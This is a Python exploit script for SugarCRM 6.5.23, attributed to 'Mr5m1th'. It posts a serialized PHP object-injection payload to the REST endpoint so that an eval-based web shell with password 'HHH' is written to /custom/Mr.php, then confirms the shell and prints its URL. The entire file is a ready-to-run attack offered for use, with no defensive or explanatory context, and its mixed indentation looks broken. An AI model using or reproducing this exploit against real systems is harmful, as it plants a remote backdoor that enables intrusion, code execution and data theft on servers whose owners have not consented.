#coding = utf8

#sugarCRM ver 6.5.23  

#Usage : python xxx.py url  

#author : Mr5m1th
import requests as req
import sys
import warnings
def exploit(url):
	exp_url = url + "/service/v4/rest.php"
 	print "[*]exploit_url:"+exp_url
	data = {
	    'method': 'login',
	    'input_type': 'Serialize',
	    'rest_data': 'O:+14:"SugarCacheFile":23:{S:17:"\\00*\\00_cacheFileName";s:16:"../custom/Mr.php";S:16:"\\00*\\00_cacheChanged";b:1;S:14:"\\00*\\00_localStore";a:1:{i:0;s:29:"<?php eval($_POST[\'HHH\']); ?>";}}',
	}
	try:
 		req.post(exp_url, data=data,verify=False)
 	except:
 		print "[-]:error occured!";
if __name__ == '__main__':
	warnings.filterwarnings('ignore')
 	main_url = sys.argv[1]
 	exploit(main_url)
 	if req.get(main_url+"/custom/Mr.php",verify=False).status_code==200:
  		print "[*]exploit_success!shell:   "+main_url+"/custom/Mr.php"+"   "+"password:HHH"
 	else:
 		print "[-]exploit fail!"
